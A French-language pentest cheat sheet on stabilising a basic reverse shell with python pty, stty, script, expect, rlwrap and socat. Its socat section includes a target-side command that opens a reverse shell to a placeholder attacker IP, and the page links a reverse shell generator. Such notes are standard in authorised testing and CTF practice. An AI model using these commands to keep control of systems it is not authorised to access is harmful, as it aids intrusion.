# Stabilisation de reverse shell

Après avoir obtenu un reverse shell basique, il est souvent instable (pas d'autocomplétion, Ctrl+C tue le shell, pas d'historique). Voici comment le stabiliser.

> **Générateur de reverse shells** : https://www.revshells.com/

---

## Méthode complète (recommandée)

### Étape 1 : Spawn d'un TTY avec Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Si Python3 n'est pas disponible :
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Étape 2 : Configuration du terminal

```bash
export TERM=xterm
export SHELL=/bin/bash
```

### Étape 3 : Suspension du shell

Appuyez sur `Ctrl+Z` (ne tapez pas, utilisez les touches)

### Étape 4 : Configuration du terminal local

Sur votre machine (macOS/Linux) :
```bash
stty raw -echo && fg
```

### Étape 5 : Réactivation

Appuyez sur `Entrée` deux fois si nécessaire.

### Étape 6 (optionnel) : Ajuster la taille du terminal

```bash
# Sur votre machine locale, dans un autre terminal
stty size
# Exemple de sortie : 50 200

# Dans le reverse shell
stty rows 50 cols 200
```

---

## Méthode simple (alternative)

Si la méthode complète pose problème :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Vous aurez un shell fonctionnel mais `Ctrl+C` tuera toujours la connexion.

---

## Alternatives sans Python

### Avec script
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Avec expect
```bash
expect -c 'spawn /bin/bash; interact'
```

### Avec socat (si disponible)

Sur votre machine :
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Sur la cible :
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:VOTRE_IP:4444
```

### Avec rlwrap (côté attaquant)

Lancez votre listener avec rlwrap pour avoir l'historique :
```bash
rlwrap nc -lvnp 4444
```

---

## Résumé rapide (copier-coller)

```bash
# 1. Sur la cible
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# 2. Ctrl+Z

# 3. Sur votre machine
stty raw -echo && fg

# 4. Entrée x2
```

---

## Dépannage

| Problème | Solution |
|----------|----------|
| `python3` introuvable | Essayer `python`, `python2` |
| Shell freeze après `stty raw -echo && fg` | Taper `reset` à l'aveugle puis Entrée |
| Pas de couleurs | `export TERM=xterm-256color` |
| Taille du terminal incorrecte | `stty rows X cols Y` |
| Ctrl+C tue le shell | Refaire la méthode complète depuis l'étape 3 |
